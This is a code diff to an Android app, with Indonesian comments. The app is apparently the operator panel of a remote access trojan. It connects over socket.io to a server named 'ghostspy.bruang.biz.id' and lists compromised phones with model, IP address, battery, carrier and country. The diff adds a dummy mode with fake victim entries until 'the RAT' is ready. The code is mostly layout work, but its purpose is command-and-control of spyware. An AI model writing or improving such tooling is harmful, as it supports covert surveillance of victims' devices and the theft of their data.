@@ -2,6 +2,7 @@ package com.testapp;
 
 import android.app.Activity;
 import android.content.Intent;
+import android.content.SharedPreferences;
 import android.os.Bundle;
 import android.os.Handler;
 import android.view.Gravity;
@@ -20,12 +21,12 @@ public class MainActivity extends Activity {
     private TextView statusText;
     private LinearLayout deviceContainer;
     private Handler handler = new Handler();
+    private boolean useDummy = true; // Ganti ke false jika sudah ada RAT
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
 
-        // Root layout
         LinearLayout root = new LinearLayout(this);
         root.setOrientation(LinearLayout.VERTICAL);
         root.setBackgroundColor(0xFF090909);
@@ -55,10 +56,9 @@ public class MainActivity extends Activity {
         statusText.setBackground(getDrawable(R.drawable.card_admin));
         statusText.setPadding(12, 6, 12, 6);
         header.addView(statusText);
-
         root.addView(header);
 
-        // Filter Capsule
+        // Filter
         LinearLayout filterBar = new LinearLayout(this);
         filterBar.setOrientation(LinearLayout.HORIZONTAL);
         filterBar.setPadding(16, 12, 16, 8);
@@ -67,7 +67,7 @@ public class MainActivity extends Activity {
         filterBar.addView(createChip("Offline", false));
         root.addView(filterBar);
 
-        // ScrollView untuk daftar perangkat
+        // ScrollView
         ScrollView scroll = new ScrollView(this);
         deviceContainer = new LinearLayout(this);
         deviceContainer.setOrientation(LinearLayout.VERTICAL);
@@ -75,17 +75,29 @@ public class MainActivity extends Activity {
         scroll.addView(deviceContainer);
         root.addView(scroll);
 
-        // Socket.io
+        // Debug info
+        TextView debugView = new TextView(this);
+        debugView.setText("Status: Mode Dummy");
+        debugView.setTextColor(0xFF9AA3B2);
+        debugView.setPadding(16, 8, 16, 8);
+        root.addView(debugView);
+
+        if (useDummy) {
+            loadDummyDevices();
+            return;
+        }
+
         try {
             socket = IO.socket("https://ghostspy.bruang.biz.id");
         } catch (URISyntaxException e) {
-            statusText.setText("❌ URL Error");
+            debugView.setText("URL Error: " + e.getMessage());
             return;
         }
 
         socket.on(Socket.EVENT_CONNECT, args -> {
             runOnUiThread(() -> {
                 statusText.setText("🟢 ONLINE");
+                debugView.setText("Status: Terhubung ke server");
                 socket.emit("get_devices");
             });
         });
@@ -109,6 +121,7 @@ public class MainActivity extends Activity {
                 }
                 runOnUiThread(() -> {
                     deviceContainer.removeAllViews();
+                    debugView.setText("Status: " + list.size() + " perangkat");
                     if (list.isEmpty()) {
                         statusText.setText("📭 Tidak ada perangkat");
                         return;
@@ -116,7 +129,6 @@ public class MainActivity extends Activity {
                     int delay = 0;
                     for (String[] data : list) {
                         LinearLayout card = buildDeviceCard(data);
-                        // Animasi masuk bertahap
                         card.setAlpha(0f);
                         deviceContainer.addView(card);
                         card.animate().alpha(1f).setStartDelay(delay).setDuration(200).start();
@@ -125,15 +137,36 @@ public class MainActivity extends Activity {
                     statusText.setText("🟢 " + list.size() + " perangkat");
                 });
             } catch (Exception e) {
-                runOnUiThread(() -> statusText.setText("⚠️ Parse error"));
+                runOnUiThread(() -> debugView.setText("Error: " + e.getMessage()));
             }
         });
 
         socket.on(Socket.EVENT_CONNECT_ERROR, args -> {
-            runOnUiThread(() -> statusText.setText("🔴 OFFLINE"));
+            runOnUiThread(() -> {
+                statusText.setText("🔴 OFFLINE");
+                debugView.setText("Error: Gagal terhubung");
+            });
         });
 
         socket.connect();
+    }
+
+    private void loadDummyDevices() {
+        String[][] dummyData = {
+            {"dummy-1", "REALME RMX3939", "Android 15", "192.168.1.5", "Just now", "22%", "WiFi (REALME C56)", "Indonesia"},
+            {"dummy-2", "REDMI 23053RN02A", "Android 15", "10.0.0.12", "2 hours ago", "18%", "Mobile (Telkomsel)", "Indonesia"},
+            {"dummy-3", "SAMSUNG S24 ULTRA", "Android 16", "172.16.0.8", "Just now", "45%", "WiFi (Office)", "Malaysia"}
+        };
+
+        int delay = 0;
+        for (String[] data : dummyData) {
+            LinearLayout card = buildDeviceCard(data);
+            card.setAlpha(0f);
+            deviceContainer.addView(card);
+            card.animate().alpha(1f).setStartDelay(delay).setDuration(200).start();
+            delay += 50;
+        }
+        statusText.setText("🟢 3 perangkat (Dummy)");
     }
 
     private TextView createChip(String text, boolean active) {
@@ -160,7 +193,6 @@ public class MainActivity extends Activity {
         lp.setMargins(0, 0, 0, 12);
         card.setLayoutParams(lp);
 
-        // Baris atas
         LinearLayout topRow = new LinearLayout(this);
         topRow.setOrientation(LinearLayout.HORIZONTAL);
         topRow.setGravity(Gravity.CENTER_VERTICAL);
@@ -174,7 +206,7 @@ public class MainActivity extends Activity {
                 0, LinearLayout.LayoutParams.WRAP_CONTENT, 1);
         modelView.setLayoutParams(modelParams);
 
-        boolean online = data[4].contains("now") || data[4].contains("Just");
+        boolean online = data[4].contains("Just");
         TextView statusBadge = new TextView(this);
         statusBadge.setText(online ? "ONLINE" : "OFFLINE");
         statusBadge.setTextColor(online ? 0xFF00E676 : 0xFF9AA3B2);
@@ -186,14 +218,12 @@ public class MainActivity extends Activity {
         topRow.addView(statusBadge);
         card.addView(topRow);
 
-        // Info
         TextView info = new TextView(this);
-        info.setText("Android " + data[2] + " | IP: " + data[3] + "\nBat: " + data[5] + "% | " + data[7]);
+        info.setText("Android " + data[2] + " | IP: " + data[3] + "\nBat: " + data[5] + " | " + data[6]);
         info.setTextColor(0xFF9AA3B2);
         info.setTextSize(12);
         card.addView(info);
 
-        // Animasi klik
         card.setOnClickListener(v -> {
             ScaleAnimation scale = new ScaleAnimation(1f, 0.97f, 1f, 0.97f,
                     android.view.animation.Animation.RELATIVE_TO_SELF, 0.5f,
